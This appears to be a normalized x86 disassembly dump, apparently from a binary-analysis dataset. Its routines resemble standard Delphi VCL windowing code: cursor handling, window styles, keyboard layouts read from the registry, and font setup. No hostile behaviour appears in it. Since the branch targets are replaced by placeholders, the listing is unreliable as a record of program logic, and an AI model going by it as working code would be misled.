cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403450
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467de4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_420754
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_467e20
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_44a49c
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_44b16c
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_467e68
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_450adc
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_4507d8
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_4507d8
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_4507d8
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_4507d8
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_4507d8
push eax
call RedrawWindow
sub_467fbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_462c74
mov dl 0x5
mov eax ebx
call sub_464ae0
mov dl 0x1
mov eax ebx
call sub_44f37c
mov dl 0x3
mov eax ebx
call sub_464ddc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_468024
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4680fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44f23c
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44f0a8
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_4494cc
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_449f2c
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404094
mov eax [ ebp - 0xc ]
call sub_404264
push eax
mov eax [ ebp - 0xc ]
call sub_404464
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_449f3c
mov eax [ ebp - 0xc ]
call sub_404264
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468102
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
mov dl 0x1
mov eax esi
call sub_464160
mov edx [ ebp - 0xc ]
mov eax esi
call sub_449fe8
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4045f0
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_468128
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44d4d0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_463884
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_44d494
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403450
inc ebp
dec edi
jne r-xdata
sub_468174
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_44f23c
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4681a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44fa44
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_4681c8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_466530
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4507d8
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_44f23c
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4507d8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4507d8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44f250
or ecx 0xffffffff
mov dl 0x1
call sub_44a660
pop esi
pop ebx
retn
sub_468260
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44feb4
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_44b16c
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_449958
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403450
sub_4682b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46837e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_449f2c
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404094
mov eax [ ebp - 0x4 ]
call sub_404264
push eax
mov eax [ ebp - 0x4 ]
call sub_404464
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_449f3c
mov eax [ ebp - 0x4 ]
call sub_404264
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_449fe8
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468385
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_464160
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045f0
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_4683a4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44fc34
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44f23c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44f250
mov dl [ ebx + 0x57 ]
call sub_449ed8
inc edi
dec esi
jne r-xdata
sub_468448
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_468478
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_4684a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41ffc4
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46884c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_468858
mov eax ebx
call sub_468864
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_464c80
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4232d4
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4232d4
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4232d4
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_468c84
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_468b60
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_468b60
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_468b60
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_468600
push ebx
push esi
push edi
push ebp
call sub_4035e0
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403254
mov eax [ ebp + 0x88 ]
call sub_403254
mov eax [ ebp + 0x84 ]
call sub_403254
mov eax [ ebp + 0x54 ]
call sub_403254
mov eax [ ebp + 0x50 ]
call sub_403254
mov eax [ ebp + 0x4c ]
call sub_403254
mov eax [ ebp + 0x30 ]
call sub_403254
mov eax [ ebp + 0x34 ]
call sub_403254
mov eax [ ebp + 0x7c ]
call sub_403254
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403254
mov eax ebp
call sub_4688c0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_420010
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035c8
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_41a5d0
call sub_403254
inc edi
dec esi
jne r-xdata
sub_468778
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4687c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a474
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a474
mov eax [ rw-data ]
call sub_46b5f8
sub_4687fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a714
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a714
mov eax [ rw-data ]
call sub_46b5f8
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_451db0
sub_468864
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_46891c
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_4688c0
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4027e4
mov ebx esi
test ebx ebx
jne r-xdata
sub_46891c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4027c4
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_468944
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_468aef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468af6
lea eax [ ebp - 0x260 ]
call sub_403fa4
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403fa4
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41c1b4
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_40923c
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_455558
test al al
je r-xdata
xor eax eax
push ebp
push sub_468aab
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404214
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404214
sub_468b60
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_46b468
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46b21c
mov dl 0x1
mov eax [ rw-data ]
call sub_46b21c
sub_468bcc
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_468bf4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_468bcc
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406e7c
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406e04
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_468c84
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_468dc9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46b21c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423664
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_423664
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_423748
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423664
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_423664
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_423664
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_46b21c
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_4234a8
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_4234a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468dd0
cmp [ rw-data ] 0x0
je r-xdata
sub_468e08
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_468e68
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_468fa4 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_469018
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_468770
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41a5d0
mov dl [ ebp - 0x1 ]
call sub_468e68
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_46875c
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
